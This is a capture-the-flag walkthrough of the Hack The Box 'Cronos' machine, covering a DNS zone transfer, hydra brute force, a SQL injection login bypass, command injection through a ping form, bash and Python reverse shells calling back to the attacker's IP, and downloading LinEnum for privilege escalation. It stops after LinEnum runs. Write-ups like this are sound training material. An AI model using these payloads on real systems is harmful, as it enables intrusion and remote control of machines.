<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->




<!doctype html>
<html lang="en" class="no-js">
  <head>
    
	
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
      
      
        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Cronos Writeup/">
      
      
        <meta name="author" content="Rushi Chaudhari">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
	<meta name="format-detection" content="telephone=no">

    
      
        <title>17. Cronos Writeup.md - Hackthebox Solutions</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
      
      
        
        
        <meta name="theme-color" content="#009688">
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../css/katex.css">
    
      <link rel="stylesheet" href="../../css/custom.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#sreconnaissance" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Hackthebox Solutions
            </span>
            <span class="md-header-nav__topic">
              
                17. Cronos Writeup.md
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Hackthebox Solutions
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Preface" class="md-nav__link">
      Preface
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      I Retired
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        I Retired
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
      1. Access Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
      2. Jerry Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
      3. Blue Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
      4. Blocky Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
      5. Calamity Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Devoops Writeup/" title="6. Devoops Writeup.md" class="md-nav__link">
      6. Devoops Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
      7. Apocalyst Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Poison Writeup wo Metasploit/" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link">
      8. Poison Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
      9. Postman Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
      10. Beep Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
      11. Help Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
      12. Mirai Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
      13. Curling Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
      14. Nibbles Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Valentine Writeup wo Metasploit/" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link">
      15. Valentine Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
      16. Popcorn Writeups.md
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        17. Cronos Writeup.md
      </label>
    
    <a href="./" title="17. Cronos Writeup.md" class="md-nav__link md-nav__link--active">
      17. Cronos Writeup.md
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#sreconnaissance" class="md-nav__link">
    sReconnaissance
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gaining-an-initial-foothold" class="md-nav__link">
    Gaining an Initial Foothold
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lessons-learned" class="md-nav__link">
    Lessons Learned
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    Conclusion
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
      18. Legacy Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
      19. Openadmin Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
      20. Bank Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
      21. Shocker Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
      22. Luke Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
      23. Arctic Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Granny Writeup/" title="24. Granny Writeup.md" class="md-nav__link">
      24. Granny Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
      25. Netmon Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link">
      26. Sense Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link">
      27. Sunday Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link">
      28. Solidstate Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
      29. Celestial Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
      30. Tenten Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
      31. Optimum Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
      32. Haircut Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
      33. Irked Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Chatterbox Writeup wo Metasploit/" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link">
      34. Chatterbox Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
      35. Bashed Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
      36. Lame Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
      37. Grandpa Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
      38. Swagshop Writeup.md
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#sreconnaissance" class="md-nav__link">
    sReconnaissance
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gaining-an-initial-foothold" class="md-nav__link">
    Gaining an Initial Foothold
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lessons-learned" class="md-nav__link">
    Lessons Learned
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    Conclusion
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Cronos Writeup.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                  <h1>17. Cronos Writeup.md</h1>
                
                <h2 id="sreconnaissance">sReconnaissance</h2>
<p>First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -O -oA initial 10.10.10.13
</pre></div>

<ul>
<li>
<p><strong>-sC</strong>: run default nmap scripts</p>
</li>
<li>
<p><strong>-sV</strong>: detect service version</p>
</li>
<li>
<p><strong>-O</strong>: detect OS</p>
</li>
<li>
<p><strong>-oA</strong>: output all formats and store in file <em>nmap/initial</em></p>
</li>
</ul>
<p>We get back the following result showing that 3 ports are open:</p>
<ul>
<li>
<p><strong>Port 80: </strong>running Apache httpd 2.4.18</p>
</li>
<li>
<p><strong>Port 22</strong>: running OpenSSH 7.2p2</p>
</li>
<li>
<p><strong>Port 53</strong>: running ISC BIND 9.10.3-P4 (DNS)</p>
</li>
</ul>
<p><img alt="" src="../../img/Cronos Writeup/1_St1x_UiegX7sCSa0P0PVKg.png" /></p>
<p>Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.</p>
<p>Let’s run an nmap scan that covers all ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -O -p- -oA full 10.10.10.13
</pre></div>

<p>We get back the following result. No other ports are open.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_9q693sxqpm-KGAHc-LTNfA.png" /></p>
<p>Similarly, we run an nmap scan with the <strong>-sU </strong>flag enabled to run a UDP scan.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sU -O -p- -oA udp 10.10.10.13
</pre></div>

<p>I managed to root the box and write this blog, while this UDP scan still did not terminate. So instead I ran another UDP scan only for the top 1000 ports.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_ugD51AwilUU6qHwQcttoRQ.png" /></p>
<h2 id="enumeration">Enumeration</h2>
<p>Port 80 is open so we’ll first visit the IP address in the browser.</p>
<p><img alt="" src="../img/Cronos Writeup/1_airdL9wwhDPKXP5iTeWJsQ-1588896299099.png" /></p>
<p>As usual, we’ll run the general nmap vulnerability scan scripts to determine if any of the services are vulnerable.</p>
<p><img alt="" src="../img/Cronos Writeup/1_Lmn4AGQ1ixJmOqEZcdKbcQ.png" /></p>
<p>We don’t get anything useful. Next, we enumerate directories on the web server.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.13
</pre></div>

<p><img alt="" src="../../img/Cronos Writeup/1_hpYL0msU3pSNn4kbLqUW3A.png" /></p>
<p>Another dead end. At this point, I googled “Apache2 Ubuntu Default Page” and the first entry I got was <a href="https://askubuntu.com/questions/603451/why-am-i-getting-the-apache2-ubuntu-default-page-instead-of-my-own-index-html-pa">this</a>. It seems that this might be a configuration issue where the IP address doesn’t know what hostname it should map to in order to serve a specific site and so instead it’s serving the Apache2 ubuntu default page.</p>
<p>After looking at the <a href="https://httpd.apache.org/docs/2.4/vhosts/examples.html">documentation</a> for virtual host configuration in Apache, we need to perform two things.</p>
<ol>
<li>
<p>Figure out the hostname(s) that the given IP address resolves to.</p>
</li>
<li>
<p>Add those entries in the /etc/hosts file. The documentation mentions that just because you have virtual host configuration on the Apache server does not magically cause DNS entries to be created for those host names. The hostnames need to resolve to a specific IP address and so since we’re doing this locally, we can simply add the configuration entries in the hosts file.</p>
</li>
</ol>
<p>For the first task, we’ll use nslookup to try and figure out the domain name. After running the command, set the server to be 10.10.10.13 and then lookup the given IP address.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_ibc-dUf0iwRDcJ5r5uwIzg.png" /></p>
<p>We can see that this resolves to ns1.cronos.htb. This gives us a domain name of cronos.htb.</p>
<p>Second, as mentioned above we need to add the entry to our /etc/hosts file.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>10.10.10.13 cronos.htb
</pre></div>

<p>This way when you browse to cronos.htb page it resolves to 10.10.10.13 and knows which page to serve based on the virtual hosts configuration.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_99lU0-9r4S0tU58LzHADqA.png" /></p>
<p>Now that we have a working domain name, let’s attempt a zone transfer to get a list of all hosts for this domain. The host command syntax for performing a zone transfer is.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>host -l &lt;domain-name&gt; &lt;dns_server-address&gt;
</pre></div>

<p>Therefore, to perform a zone transfer we use the following command.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>host -l cronos.htb 10.10.10.13
</pre></div>

<p>We get back the following result.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_4VZzsFbgSOteZzFNoe86Zw.png" /></p>
<p>Add the entries in your hosts file.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>10.10.10.13 cronos.htb www.cronos.htb admin.cronos.htb
</pre></div>

<p>Let’s visit the admin page.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_xWbSZIFXwCVnaYkmV90RaA.png" /></p>
<p>We’re presented with a login page. We’ll try and use that to gain an initial foothold on this box.</p>
<h2 id="gaining-an-initial-foothold">Gaining an Initial Foothold</h2>
<p>The first thing to try is common credentials (admin/admin, admin/cronos, etc.). That didn’t work and this is clearly a custom application, so we won’t find default credentials online. The next step would be to run a password cracker on it.</p>
<p>I’m going to use john’s password file.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>locate password | grep john
</pre></div>

<p><img alt="" src="../../img/Cronos Writeup/1_EcMuCm1x3DBxvSOVAJORRA.png" /></p>
<p>Let’s see how many passwords the file contains.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>wc -l /usr/share/john/password.lst
</pre></div>

<p><img alt="" src="../../img/Cronos Writeup/1_4pL2fmK4aDKaUfLdUOhh3g.png" /></p>
<p>3559 passwords is good enough. Let’s pass the file to hydra and run a brute force attack.</p>
<p>To do that, first intercept the request with Burp to see the form field names and the location that the request is being sent to.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_apsjy2qJBWjtQ5b38a3Bpw.png" /></p>
<p>Now we have all the information we need to run hydra.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>hydra -l &#39;admin&#39; -P /usr/share/john/password.lst admin.cronos.htb http-post-form &quot;/:username=^USER^&amp;password=^PASS^&amp;Login=Login:Your Login Name or Password is invalid&quot;
</pre></div>

<ul>
<li>
<p>-l: specifies the username to be admin.</p>
</li>
<li>
<p>-P: specifies the file that contains the passwords.</p>
</li>
<li>
<p>http-post-form: we’re sending a POST request.</p>
</li>
<li>
<p>“….”: the content in the double quotes specifies the username/password parameters to be tested and the failed login message.</p>
</li>
</ul>
<p>If you want to see the requests that hydra is sending to confirm everything is working properly you can use the “-d” option.</p>
<p><strong>Note from the future</strong>: Hydra (with the above configuration) doesn’t end up guessing any valid passwords.</p>
<p>While this is running, let’s try to see if the form is vulnerable to SQL injection. To do this manually, you can get any <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">SQL injection cheat sheet</a> from online. After I tried a few, the following payload in the username field successfully exploited the SQL injection vulnerability.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>admin&#39; #
</pre></div>

<p>This bypasses authentication and presents us with the welcome page.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_gzjFmx6KWS_fbUYaKHDJAw.png" /></p>
<p>Generally, you would use sqlmap to check if the application is vulnerable to SQL injection, however, since I’m working towards my OSCP and sqlmap is not allowed, I had to resort to manual means.</p>
<p>Regardless, if you want to perform the attack using sqlmap, first intercept the request using Burp and save it in a file (login.txt). Then, run sqlmap on the request.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>sqlmap -v 4 -r login.txt
</pre></div>

<p>I used the verbosity level 4 so that I can see the payload sqlmap uses for each request.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_jxxay73Vo5QZO204n3HLZw.png" /></p>
<p>For the above payload we get a redirect to the welcome page. To test it out, go back to the browser and enter the payload in the username field. Then hit submit.</p>
<p><img alt="" src="https://cdn-images-1.medium.com/max/2000/1*2Spbxzsu_cI_IiIdJrVzuw.png" /></p>
<p>We’re presented with the login page!</p>
<p><img alt="" src="../../img/Cronos Writeup/1_0lUw-G6uCqlf7Mjzd0FZmA.png" /></p>
<p>Now that we saw both the manual &amp; automated way of exploiting SQL injections, let’s proceed with solving the box.</p>
<p>The commands being used on the welcome page are “traceroute” and “ping” so this specific functionality of the application clearly talks to the operating system. Let’s see if it’s vulnerable to command injection. Add the following in the input field and execute the code.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>8.8.8.8 &amp; whoami
</pre></div>

<p>What the above command does is run the the preceding command (ping 8.8.8.8) in the background and execute the whoami command.</p>
<p>We get back the following result. It’s definitely vulnerable! The web server is running with the privileges of the web daemon user www-data.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_K3dFDGqCBL3kKmpSaMs71g.png" /></p>
<p>Since we can run arbitrary commands using this tool, let’s get it to send a reverse shell back to our attack box.</p>
<p><strong>Note</strong>: It’s not necessary to do this using Burp.</p>
<p>First, intercept the request with Burp and send it to Repeater (right click &gt; Send to Repeater).</p>
<p>Go to pentestmonkey <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a> and grab the bash reverse shell. Change the IP address and port to those applicable to your attack machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1
</pre></div>

<p>Highlight the entire string and click on CTRL+U to URL encode it.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_4kzlbFV-7uYIf1JzpmDEsA.png" /></p>
<p>Set up a listener on the attack machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 4444
</pre></div>

<p>Execute the request. It doesn’t send a reverse shell back. Check if bash is installed on the machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>which bash
</pre></div>

<p><img alt="" src="../../img/Cronos Writeup/1_5ljbBdyQo5QOKxfjBdFdnA.png" /></p>
<p>It is so I’m not sure why this didn’t work. Let’s try python.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.6&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</pre></div>

<p>Again, don’t forget to URL encode it.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_a_2rl6isI-8XzSMcf9fyFw.png" /></p>
<p>We get back a low privileged shell!</p>
<p><img alt="" src="../../img/Cronos Writeup/1_HlbmfN58w08F8xgCSTlpsw.png" /></p>
<p>Let’s upgrade it to a better shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
</pre></div>

<p>This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>stty raw -echo
</pre></div>

<p>Once that is done, run the command “fg” to bring netcat back to the foreground.</p>
<p>Grab the user flag.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_OprXSZljihjVu0LhZ_w28g.png" /></p>
<p>We need to escalate privileges.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Let’s transfer the LinEnum script from our attack machine to the target machine.</p>
<p>In the attack machine, start up a server in the same directory that the script resides in.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
</pre></div>

<p>In the target machine, change to the /tmp directory where we have write privileges and download the LinEnum script.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>cd /tmp
<span class="lineno" data-linenos="2 "></span>wget http://10.10.14.6:5555/LinEnum.sh
</pre></div>

<p>Give it execute privileges.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>chmod +x LinEnum.sh
</pre></div>

<p>Run the script.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./LinEnum.sh
</pre></div>

